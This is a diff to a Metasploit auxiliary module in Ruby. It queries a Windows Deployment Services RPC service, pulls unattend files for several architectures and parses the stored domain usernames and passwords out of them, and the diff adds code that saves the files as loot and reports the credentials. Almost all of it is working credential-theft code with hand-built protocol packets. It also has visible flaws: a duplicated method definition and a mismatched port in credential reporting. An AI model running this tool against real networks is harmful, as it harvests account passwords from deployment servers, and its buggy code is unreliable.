@@ -1,14 +1,9 @@
 ##
-# $Id: ms05_017_msmq.rb 14976 2012-03-18 05:08:13Z rapid7 $
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
 #   http://metasploit.com/
 ##
-
 
 require 'msf/core'
 require 'rex/proto/dcerpc'
@@ -22,6 +17,7 @@ load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'
 class Metasploit3 < Msf::Auxiliary
 
     include Msf::Exploit::Remote::DCERPC
+	include Msf::Auxiliary::Report 
 
     DCERPCPacket   = Rex::Proto::DCERPC::Packet
     DCERPCClient   = Rex::Proto::DCERPC::Client
@@ -34,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
 			'Description'    => %q{
 						This module retrieves the client unattend file from Windows
-						Deployment Services RPC service.
+						Deployment Services RPC service and parses out the stored credentials
 			},
 			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
 			'License'        => MSF_LICENSE,
@@ -50,44 +46,74 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(5040),
 			], self.class)
+		
+		#Easier way to make these into enum?
+		@architectures = {
+			'x64' => 9,
+			'x86' => 0,
+			'ia64' => 6,
+			'arm' => 5
+		}
 	end
 	
 	def run 
-	
 		# Create a handler with our UUID and Transfer Syntax
 		self.handle = Rex::Proto::DCERPC::Handle.new(	['1a927394-352e-4553-ae3f-7cf4aafca620', '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
-														'ncacn_ip_tcp', rhost, [datastore['RPORT']])
+														'ncacn_ip_tcp', 
+														rhost, 
+														[datastore['RPORT']])
 		
 		print_status("Binding to #{handle} ...")
-		self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
-		print_status("Bound to #{handle} ...")
+		begin
+			self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
+			vprint_status("Bound to #{handle} ...")
+			rescue
+				print_error("Unable to bind")
+				return
+		end
 		
+		table = Rex::Ui::Text::Table.new({
+                        'Header' => 'WindowsDeploymentServices',
+                        'Indent' => 1,
+                        'Columns' => ['Architecture', 'Domain', 'Username', 'Password']
+        })
 		
-		archs = [9,0,6,5]
-	
-		archs.each do |raw|
-			arch  = [raw].pack('C')
-			result = request_client_unattend(arch)
+		@architectures.each do |architecture|
+			result = request_client_unattend(architecture)
 			
 			unless result.nil?
-				parse_client_unattend(result)
+				loot_unattend(architecture[0], result)
+				results = parse_client_unattend(result)
+				
+				results.each do |result|
+					unless result.empty?
+						unless result['username'].nil? || result['password'].nil?
+							print_good("Retrived credentials for #{architecture[0]}")
+							report_creds(result['domain'], result['username'], result['password'])
+							table << [architecture[0], result['domain'], result['username'], result['password']]
+						end
+					end
+				end
 			end
 		end
+		
+		print_line table.to_s
 	end
 	
-	def request_client_unattend(arch)	
+	def request_client_unattend(architecture)	
 		# Construct WDS Control Protocol Message:
 		header = "\x38\x02\x00\x00\x00\x00\x00\x00\x38\x02\x00\x00\x00\x00\x00\x00"
-
 		endpoint_header = "\x28\x00\x00\x01\x10\x02\x00\x00\x5a\xeb\xde\xd8\xfd\xef\xb2\x43\x99\xfc\x1a\x8a\x59\x21\xc2\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		operation_header = "\x10\x02\x00\x00\x00\x01\x01\x73\x05\x00\x00\x00\x04\x00\x00\x00"
 		
 		architecture_variable_header = "\x41\x00\x52\x00\x43\x00\x48\x00\x49\x00\x54\x00\x45\x00\x43\x00\x54\x00\x55\x00\x52\x00\x45\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
+		
+		arch  = [architecture[1]].pack('C')
+		
 		architecture_value = "#{arch}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		architecture_variable = architecture_variable_header + architecture_value
 		
 		client_guid_variable = "\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x47\x00\x55\x00\x49\x00\x44\x00\x00\x00\x49\x00\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00\x00\x00\x61\x00\x38\x00\x39\x00\x00\x00\x6d\x69\x6e\x69\x6e\x74"
-
 		client_mac_variable_header = "\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x4d\x00\x41\x00\x43\x00\x00\x00\x36\x6f\x31\x33\x37\x3c\x08\x4d\x53\x46\x54\x20\x35\x2e\x30\x37\x0c\x01\x0f\x03\x06\x2c\x2e\x2f\x1f\x21\x79\xf9\x2b\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00"
 
 		# TODO Does this need to match our current MAC? Doesn't appear to care.
@@ -97,19 +123,20 @@ class Metasploit3 < Msf::Auxiliary
 		
 		stub_data = header + endpoint_header + operation_header + architecture_variable + client_guid_variable + client_mac_variable_header + client_mac_value + version_variable
 		
-		print_status('Sending Client Unattend request ...')
+		vprint_status("Sending #{architecture[0]} Client Unattend request ...")
 		response = dcerpc.call(0, stub_data)
 
 		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-			print_status('Received response ...')
+			vprint_status('Received response ...')
 			data = dcerpc.last_response.stub_data
 			
 			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000)
 			op_error_code = data.unpack('i*')[18]
 			if op_error_code == 0
-				return dcerpc.last_response.stub_data
+				vprint_status("Received #{architecture[0]} response")
+				return extract_unattend(dcerpc.last_response.stub_data)
 			else
-				print_error("Error code received: #{op_error_code}")
+				vprint_error("Error code received for #{architecture[0]}: #{op_error_code}")
 				return nil
 			end
 		end
@@ -123,16 +150,39 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def parse_client_unattend(data)
 		begin
-			xml = REXML::Document.new(extract_unattend(data))
+			xml = REXML::Document.new(data)
+
 			rescue REXML::ParseException => e
 					print_error("Invalid XML format")
 					vprint_line(e.message)
 			end
-	
-		tables = Rex::Parser::Unattend.parse(xml).flatten
-		
-		tables.each do |out|
-			print_line(out.to_s)
-		end
+    
+		return Rex::Parser::Unattend.parse(xml).flatten
 	end
+	
+	def loot_unattend(archi, data)
+			return if data.empty?	
+			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
+			print_status("Raw version of #{archi} saved as: #{p}")
+	end
+	
+	def loot_unattend(archi, data)
+			return if data.empty?	
+			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
+			print_status("Raw version of #{archi} to loot")
+	end
+	
+	def report_creds(domain, user, pass)
+		report_auth_info(
+				:host  => rhost,
+				:port => 4050,
+				:sname => 'dcerpc',
+				:proto => 'tcp',
+				:source_id => nil,
+				:source_type => "aux",
+				:user => "#{domain}\\#{user}",
+				:pass => pass)
+	end
+
+
 end
